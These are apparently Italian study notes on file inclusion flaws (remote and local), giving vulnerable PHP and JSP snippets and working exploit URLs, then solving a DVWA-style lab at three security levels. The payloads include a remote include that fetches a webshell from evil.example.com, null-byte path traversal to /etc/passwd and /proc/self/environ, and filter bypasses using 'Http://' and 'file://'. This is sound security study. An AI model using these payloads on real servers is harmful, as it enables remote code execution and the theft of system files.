## File inclusion

- https://en.wikipedia.org/wiki/Remote_File_Inclusion
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion

Si ha questa vulnerabilità quando un'applicazione crea un path per il codice eseguibile usando una variabile che è sotto il controllo dell'attaccante,
in un modo che gli permette di controllare quale file viene eseguito.
Lo sfruttamento di una vulnerabilità di questo tipo permette una RCE sul server che esegue l'appicazione vulnerabile.

- Remote File Inclusion: l'applicazione scarica ed esegue un file remoto
- Local File Inclusion: come il RFI ma il file sfruttato è presente sul server

**PHP**

Funzioni che includono un file per l'esecuzione sono `include` e `require`.
La direttiva `allow_url_fopen` o `allow_url_include` (in `php.ini`) abilitata permette di usare una URL per scaricare un file remoto ed eseguirlo.
Anche se disabilitato è raggirabile con compressione (`zlib://`) o stream audio (`ogg://`) che non ispezionano il flag URL PHP interno.
Si possono sfruttare anche i wrapper PHP come `php://input`.

Codice vulnerabile:

```
<form method="get">
   <select name="language">
      <option value="english">English</option>
      <option value="french">French</option>
      ...
   </select>
   <input type="submit">
</form>

<?php
   if ( isset( $_GET['language'] ) ) {
      include( $_GET['language'] . '.php' );
   }
?>
```

Exploit:

```
/vulnerable.php?language=http://evil.example.com/webshell.txt?
/vulnerable.php?language=C:\\ftp\\upload\\exploit
/vulnerable.php?language=C:\\notes.txt%00
/vulnerable.php?language=../../../../../etc/passwd%00
/vulnerable.php?language=../../../../../proc/self/environ%00
```

**JSP**

Anche le JSP sono vulnerabili a Null byte injection (`%00`)

Codice vulnerabile:

```
<%
   String p = request.getParameter("p");
   @include file="<%="includes/" + p +".jsp"%>"
%>
```

Exploit:

```
/vulnerable.jsp?p=../../../../var/log/access.log%00
```

### File Inclusion - Low

```
// The page we wish to display
$file = $_GET[ 'page' ];
```

Exploit:

- RFI

	- creare il file `rfi-low.php` contenente `<?php phpinfo(); ?>`
	- accedere a `http://172.17.0.2/vulnerabilities/fi/?page=http://172.17.0.3/rfi-low.php`


- LFI: `http://172.17.0.2/vulnerabilities/fi/?page=/etc/passwd`

### File Inclusion - Medium

```
// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file ); 
```

Exploit:

- RFI: `http://172.17.0.2/vulnerabilities/fi/?page=Http://172.17.0.3/rfi-low.php`, notare `Http` nell'URL della risorsa acceduta

- LFI: `http://172.17.0.2/vulnerabilities/fi/?page=/etc/passwd`

### File Inclusion - High

```
// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) { ... }
```

fnmatch — Match filename against a pattern

Exploit:

- LFI: `http://172.17.0.2/vulnerabilities/fi/?page=file:///etc/passwd`

